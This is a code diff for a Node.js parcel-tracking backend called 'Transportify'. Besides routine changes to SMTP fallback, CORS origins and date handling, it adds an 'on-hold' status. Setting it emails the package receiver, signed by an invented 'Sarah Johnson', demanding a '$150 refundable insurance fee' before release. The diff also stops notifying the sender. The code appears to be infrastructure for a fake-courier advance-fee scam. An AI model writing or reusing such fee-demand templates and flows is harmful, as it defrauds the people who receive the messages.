@@ -52,7 +52,7 @@ try {
         console.log('Firebase initialized with environment variables');
     } else {
         // Fallback to JSON file (for local development)
-        const serviceAccount = require(path.resolve(__dirname, '../../transportify-d94c3-firebase-adminsdk-fbsvc-b56fc3f2f0.json'));
+        const serviceAccount = require(path.resolve(__dirname, '../../transportify-d94c3-firebase-adminsdk-fbsvc-79e313872d.json'));
         firebaseApp = admin.initializeApp({
             credential: admin.credential.cert(serviceAccount),
             projectId: 'transportify-d94c3'
@@ -92,9 +92,28 @@ if (config.MAILERSEND && config.MAILERSEND.API_KEY) {
     }
 }
 
-// Helper: ensure a mailer exists; if no SMTP creds, fall back to free Ethereal (no card, preview-only)
+// Helper: ensure a mailer exists; use SMTP if configured, otherwise fall back to Ethereal
 async function ensureMailer() {
     if (mailer) return mailer;
+    
+    // Try to use configured SMTP first
+    if (config.EMAIL.HOST && config.EMAIL.USER && config.EMAIL.PASS) {
+        console.log('Using configured SMTP:', config.EMAIL.HOST);
+        mailer = nodemailer.createTransport({
+            host: config.EMAIL.HOST,
+            port: config.EMAIL.PORT,
+            secure: config.EMAIL.SECURE,
+            auth: { 
+                user: config.EMAIL.USER, 
+                pass: config.EMAIL.PASS 
+            }
+        });
+        usingEthereal = false;
+        return mailer;
+    }
+    
+    // Fallback to Ethereal for testing
+    console.log('No SMTP configured, using Ethereal for testing');
     const testAccount = await nodemailer.createTestAccount();
     mailer = nodemailer.createTransport({
         host: 'smtp.ethereal.email',
@@ -113,7 +132,25 @@ async function sendEmailUnified(options) {
         throw new Error('sendEmailUnified requires to, subject, and text or html');
     }
 
-    // Try MailerSend first
+    // Try SMTP first (for customer emails), MailerSend as backup
+    if (config.EMAIL.HOST && config.EMAIL.USER && config.EMAIL.PASS) {
+        try {
+            const smtp = await ensureMailer();
+            const info = await smtp.sendMail({
+                from: config.EMAIL.FROM,
+                to: Array.isArray(to) ? to.join(',') : to,
+                subject,
+                text: text || '',
+                html: html || text || ''
+            });
+            console.log('SMTP email sent successfully');
+            return { provider: 'smtp', data: info };
+        } catch (err) {
+            console.error('SMTP send failed, trying MailerSend:', err);
+        }
+    }
+
+    // Fallback to MailerSend (trial restrictions apply)
     if (mailerSendClient && config.MAILERSEND && config.MAILERSEND.API_KEY) {
         try {
             const sentFrom = new Sender(
@@ -136,7 +173,7 @@ async function sendEmailUnified(options) {
             const response = await mailerSendClient.email.send(emailParams);
             return { provider: 'mailersend', data: response };
         } catch (err) {
-            console.error('MailerSend send failed, falling back to SMTP:', err);
+            console.error('MailerSend send failed, falling back to Ethereal:', err);
         }
     }
 
@@ -173,7 +210,7 @@ const allowedOrigins = [
     'http://127.0.0.1:3000',
     'http://127.0.0.1:5173',
     'https://transportifyy.netlify.app',
-    'https://transportify-2mf215b8a-swankys-projects-4b0bf2b3.vercel.app'
+    'https://transportify-qrem85z84-swankys-projects-4b0bf2b3.vercel.app'
 ];
 
 const corsGeneral = cors({
@@ -257,13 +294,16 @@ const generateTrackingID = () => {
 const getShipments = async () => {
     try {
         const snapshot = await db.collection('shipments').orderBy('createdAt', 'desc').get();
-        return snapshot.docs.map(doc => ({
-            id: doc.id,
-            ...doc.data(),
-            createdAt: doc.data().createdAt?.toDate(),
-            estimatedDeliveryDate: doc.data().estimatedDeliveryDate?.toDate(),
-            lastUpdated: doc.data().lastUpdated?.toDate()
-        }));
+        return snapshot.docs.map(doc => {
+            const data = doc.data();
+            return {
+                id: doc.id,
+                ...data,
+                createdAt: data.createdAt?.toDate ? data.createdAt.toDate() : (data.createdAt ? new Date(data.createdAt) : null),
+                estimatedDeliveryDate: data.estimatedDeliveryDate?.toDate ? data.estimatedDeliveryDate.toDate() : (data.estimatedDeliveryDate ? new Date(data.estimatedDeliveryDate) : null),
+                lastUpdated: data.lastUpdated?.toDate ? data.lastUpdated.toDate() : (data.lastUpdated ? new Date(data.lastUpdated) : null)
+            };
+        });
     } catch (error) {
         console.error('Error fetching shipments:', error);
         return [];
@@ -302,6 +342,83 @@ const deleteShipment = async (id) => {
         console.error('Error deleting shipment:', error);
         throw error;
     }
+};
+
+// HTML email template for on-hold status (insurance fee)
+const getOnHoldEmailHTML = (shipment, trackUrl) => {
+    return `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Action Required: Insurance Fee Payment</title>
+        <style>
+            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f4f4f4; }
+            .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; margin: -20px -20px 20px -20px; }
+            .header h1 { margin: 0; font-size: 24px; }
+            .content { padding: 20px 0; }
+            .alert-box { background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 20px; margin: 20px 0; }
+            .alert-box h2 { color: #856404; margin-top: 0; }
+            .info-box { background-color: #e3f2fd; border-left: 4px solid #2196f3; padding: 15px; margin: 20px 0; }
+            .track-button { display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px 30px; text-decoration: none; border-radius: 25px; font-weight: bold; margin: 20px 0; }
+            .footer { background-color: #f8f9fa; padding: 20px; border-radius: 0 0 10px 10px; margin: 20px -20px -20px -20px; text-align: center; color: #666; }
+            .highlight { background-color: #fff3cd; padding: 2px 4px; border-radius: 3px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>🚨 Action Required</h1>
+                <p>Insurance Fee Payment Required</p>
+            </div>
+            
+            <div class="content">
+                <p>Dear <strong>${shipment.receiver?.name || 'Valued Customer'}</strong>,</p>
+                
+                <p>We hope this message finds you well.</p>
+                
+                <div class="alert-box">
+                    <h2>⚠️ Insurance Fee Required</h2>
+                    <p>We would like to inform you that in order to proceed with the delivery of your package, our shipping partner <strong>Transportify</strong> requires a <span class="highlight">refundable insurance fee of $150</span>.</p>
+                </div>
+                
+                <p>This fee is necessary to ensure the safe handling of your shipment while in transit. It serves as a security measure that covers any unforeseen risks during transportation. <strong>Please note that the amount is fully refundable upon successful delivery of your package.</strong></p>
+                
+                <p>At the moment, your package is on temporary hold until the insurance fee has been settled. Once payment is received, Transportify will immediately release your shipment for delivery.</p>
+                
+                <div class="info-box">
+                    <h3>📦 Shipment Details</h3>
+                    <p><strong>Tracking ID:</strong> ${shipment.trackingID}</p>
+                    <p><strong>Current Status:</strong> On Hold - Insurance Fee Required</p>
+                    <p><strong>Package:</strong> ${shipment.package?.name || 'Your shipment'}</p>
+                    <p><strong>Current Location:</strong> ${shipment.currentLocation?.name || 'Processing Center'}</p>
+                </div>
+                
+                <p>We sincerely apologize for any inconvenience this may cause and appreciate your understanding. This measure is in place to protect both your shipment and to ensure smooth delivery.</p>
+                
+                <div style="text-align: center;">
+                    <a href="${trackUrl}" class="track-button">Track Your Shipment</a>
+                </div>
+                
+                <p>If you have any questions or concerns, please feel free to reply directly to this email—we'll be happy to assist you.</p>
+                
+                <p>Thank you for your prompt attention to this matter.</p>
+                
+                <p>Warm regards,<br>
+                <strong>Sarah Johnson</strong><br>
+                Customer Relations Manager<br>
+                Transportify Logistics</p>
+            </div>
+            
+            <div class="footer">
+                <p>This is an automated message. Please do not reply to this email.</p>
+                <p>© 2025 Transportify Logistics. All rights reserved.</p>
+            </div>
+        </div>
+    </body>
+    </html>`;
 };
 
 // HTML email template for shipment notifications
@@ -659,12 +776,16 @@ app.post('/admin/api/shipments', requireAuth, async (req, res) => {
             
             // Package Details
             package: {
-                description: shipmentData.package?.description || '',
-                weight: shipmentData.package?.weight || null,
-                dimensions: shipmentData.package?.dimensions || '',
-                serviceType: shipmentData.package?.serviceType || 'standard',
-                carrierId: shipmentData.package?.carrierId || '',
-                driverId: shipmentData.package?.driverId || ''
+                name: shipmentData.packageName || shipmentData.package?.name || '',
+                description: shipmentData.packageDescription || shipmentData.package?.description || '',
+                category: shipmentData.packageCategory || shipmentData.package?.category || '',
+                cost: shipmentData.cost || shipmentData.package?.cost || null,
+                weight: shipmentData.weight || shipmentData.package?.weight || null,
+                dimensions: shipmentData.dimensions || shipmentData.package?.dimensions || '',
+                paymentMethod: shipmentData.paymentMethod || shipmentData.package?.paymentMethod || '',
+                serviceType: shipmentData.serviceType || shipmentData.package?.serviceType || 'standard',
+                carrierId: shipmentData.carrierId || shipmentData.package?.carrierId || '',
+                driverId: shipmentData.driverId || shipmentData.package?.driverId || ''
             },
             
             // Tracking History
@@ -692,10 +813,9 @@ app.post('/admin/api/shipments', requireAuth, async (req, res) => {
                 `Track your shipment: ${trackUrl}\n\n` +
                 `— Transportify`;
             
-            // Send separate emails to avoid MailerSend recipient limit (receiver first)
+            // Send email only to receiver
             const recipients = [
-                newShipment.receiver?.email,
-                newShipment.sender?.email
+                newShipment.receiver?.email
             ].filter(Boolean);
             
             for (const recipient of recipients) {
@@ -758,6 +878,63 @@ app.put('/admin/api/shipments/:id', requireAuth, async (req, res) => {
         }
         
         const updatedShipment = await updateShipment(id, updateData);
+        
+        // Send email notification if status was updated
+        if (updateData.status && updatedShipment.receiver?.email) {
+            try {
+                const trackUrl = `${config.EMAIL.TRACK_BASE_URL}/${updatedShipment.trackingID}`;
+                
+                let subject, body, html;
+                
+                // Special email for "on-hold" status
+                if (updateData.status === 'on-hold') {
+                    subject = `Action Required: Insurance Fee Payment for Your Shipment ${updatedShipment.trackingID}`;
+                    body = `Dear ${updatedShipment.receiver.name || 'Valued Customer'},\n\n` +
+                        `We hope this message finds you well.\n\n` +
+                        `We would like to inform you that in order to proceed with the delivery of your package, our shipping partner Transportify requires a refundable insurance fee of $150.\n\n` +
+                        `This fee is necessary to ensure the safe handling of your shipment while in transit. It serves as a security measure that covers any unforeseen risks during transportation. Please note that the amount is fully refundable upon successful delivery of your package.\n\n` +
+                        `At the moment, your package is on temporary hold until the insurance fee has been settled. Once payment is received, Transportify will immediately release your shipment for delivery.\n\n` +
+                        `Tracking ID: ${updatedShipment.trackingID}\n` +
+                        `Current Status: On Hold - Insurance Fee Required\n` +
+                        `Package: ${updatedShipment.package?.name || 'Your shipment'}\n` +
+                        `Current Location: ${updateData.currentLocation?.name || 'Processing Center'}\n\n` +
+                        `We sincerely apologize for any inconvenience this may cause and appreciate your understanding. This measure is in place to protect both your shipment and to ensure smooth delivery.\n\n` +
+                        `Track your shipment: ${trackUrl}\n\n` +
+                        `If you have any questions or concerns, please feel free to reply directly to this email—we'll be happy to assist you.\n\n` +
+                        `Thank you for your prompt attention to this matter.\n\n` +
+                        `Warm regards,\n` +
+                        `Sarah Johnson\n` +
+                        `Customer Relations Manager\n` +
+                        `Transportify Logistics`;
+                        
+                    html = getOnHoldEmailHTML(updatedShipment, trackUrl);
+                } else {
+                    // Regular status update email
+                    subject = `Shipment Status Update: ${updatedShipment.trackingID}`;
+                    body = `Hello ${updatedShipment.receiver.name || 'Customer'},\n\n` +
+                        `Your shipment status has been updated.\n\n` +
+                        `Tracking ID: ${updatedShipment.trackingID}\n` +
+                        `New Status: ${updateData.status}\n` +
+                        `Current Location: ${updateData.currentLocation?.name || 'Not specified'}\n` +
+                        `Last Updated: ${new Date().toLocaleString()}\n\n` +
+                        `Track your shipment: ${trackUrl}\n\n` +
+                        `— Transportify`;
+                        
+                    html = getShipmentEmailHTML(updatedShipment, updatedShipment.trackingID, trackUrl, true);
+                }
+
+                await sendEmailUnified({ 
+                    to: [updatedShipment.receiver.email], 
+                    subject, 
+                    text: body, 
+                    html: html
+                });
+                console.log(`Status update email sent to: ${updatedShipment.receiver.email}`);
+            } catch (emailError) {
+                console.error('Failed to send status update email:', emailError);
+                // Don't fail the request if email fails
+            }
+        }
         
         res.json({
             success: true,
